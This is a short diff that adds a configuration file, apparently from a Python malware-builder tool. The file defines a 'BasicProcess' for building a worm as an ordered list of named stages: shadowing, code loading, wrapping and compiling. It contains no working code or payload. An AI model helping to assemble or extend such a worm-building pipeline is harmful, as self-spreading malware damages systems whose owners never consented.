@@ -1,0 +1,14 @@
+#!name##BasicProcess
+#!types##process
+#!info##The basic process of building a worm in python. The code goes through several steps before it is compiled. If you don't have any of the stages then the step will be skipped.
+
+
+
+[BASE]
+[SHADOW]
+[STARTER]
+[ADD_IMPORTS]
+[CODE_LOADER]
+[WRAPPER]
+[SAVE_RAW]
+[COMPILER]
